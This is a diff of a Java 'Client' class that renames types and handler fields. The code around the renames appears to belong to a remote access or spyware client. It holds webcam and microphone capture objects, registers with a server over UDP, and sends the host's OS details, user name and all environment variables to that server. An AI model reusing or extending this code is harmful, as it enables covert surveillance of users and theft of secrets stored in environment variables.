@@ -1,6 +1,7 @@
 package Client;
 
 import Client.Features.*;
+import Handler.Message;
 import Handler.ObjectHandler;
 import Handler.InfoHandler;
 import Tools.Network.NetworkInterface;
@@ -28,7 +29,7 @@ public class Client extends NetworkInterface {
     private final int id = rand.nextInt(1000000);
 
     private final InfoHandler infoHandler;
-    private final ObjectHandler<ClientInfo<?>> objectHandler;
+    private final ObjectHandler<Message<?>> clientObjectHandler;
 
     private final CameraCapture cameraCapture = new CameraCapture(0);
     private final AudioCapture audioCapture = new AudioCapture();
@@ -40,7 +41,7 @@ public class Client extends NetworkInterface {
         super(PORT);
         socket = new DatagramSocket();
         infoHandler = new InfoHandler(socket);
-        objectHandler = new ObjectHandler<>();
+        clientObjectHandler = new ObjectHandler<>();
         threadListener.execute(listener());
     }
 
@@ -48,8 +49,8 @@ public class Client extends NetworkInterface {
         return () -> {
             try {
                 String value = String.valueOf(id);
-                ClientInfo<String[]> info = () -> new String[]{String.valueOf(CommandByte.START_BYTE), value};
-                byte[] infoData = Objects.requireNonNull(objectHandler.writeObjects(info));
+                Message<String[]> info = () -> new String[]{String.valueOf(CommandByte.START_BYTE), value};
+                byte[] infoData = Objects.requireNonNull(clientObjectHandler.writeObjects(info));
                 socket.connect(address, PORT);
                 infoHandler.send(infoData, infoData.length);
                 socket.disconnect();
@@ -66,17 +67,17 @@ public class Client extends NetworkInterface {
 
     private Runnable infoListener() {
         return () -> {
-            ClientInfo<String[]> osInfoClient = () -> new String[]
+            Message<String[]> osInfoClient = () -> new String[]
                     {       System.getProperty("os.name"),
                             System.getProperty("os.version"),
                             System.getProperty("os.vendor"),
                             System.getProperty("os.arch"),
                             System.getProperty("user.name")
                     };
-            ClientInfo<Map<String, String>> osInfoSystem = System::getenv;
+            Message<Map<String, String>> osInfoSystem = System::getenv;
 
-            byte[] objInfo = Objects.requireNonNull(objectHandler.writeObjects(osInfoClient));
-            byte[] objSystem = Objects.requireNonNull(objectHandler.writeObjects(osInfoSystem));
+            byte[] objInfo = Objects.requireNonNull(clientObjectHandler.writeObjects(osInfoClient));
+            byte[] objSystem = Objects.requireNonNull(clientObjectHandler.writeObjects(osInfoSystem));
 
             try {
                 socket.connect(address, PORT);
